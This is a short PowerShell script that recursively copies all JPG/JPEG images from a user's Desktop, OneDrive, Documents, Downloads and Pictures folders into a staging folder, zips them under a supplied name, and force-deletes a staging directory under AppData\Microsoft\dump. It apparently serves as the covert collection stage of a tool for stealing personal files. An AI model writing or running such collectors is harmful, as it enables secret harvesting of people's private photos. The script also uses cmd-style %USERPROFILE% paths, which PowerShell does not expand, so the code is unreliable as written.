param (
    [Parameter()]
    [String]$dump_file_name
)

mkdir pic_files ; Set-Location pic_files
Get-ChildItem -Path "%USERPROFILE%\Desktop\*" -Include *.jpg,*.jpeg -Recurse | Copy-Item -Destination .
Get-ChildItem -Path "%USERPROFILE%\OneDrive\Desktop\*" -Include *.jpg,*.jpeg -Recurse | Copy-Item -Destination .
Get-ChildItem -Path "%userprofile%\Documents\*" -Include *.jpg,*.jpeg -Recurse | Copy-Item -Destination .
Get-ChildItem -Path "%USERPROFILE%\Downloads\*" -Include *.jpg,*.jpeg -Recurse | Copy-Item -Destination .
Get-ChildItem -Path "%userprofile%\Pictures\*" -Include *.jpg,*.jpeg -Recurse | Copy-Item -Destination .

Set-Location ..
Compress-Archive -Path .\pic_files -DestinationPath "$dump_file_name"
Remove-Item -Path "$env:appdata\Microsoft\dump\pic_files" -recurse -Force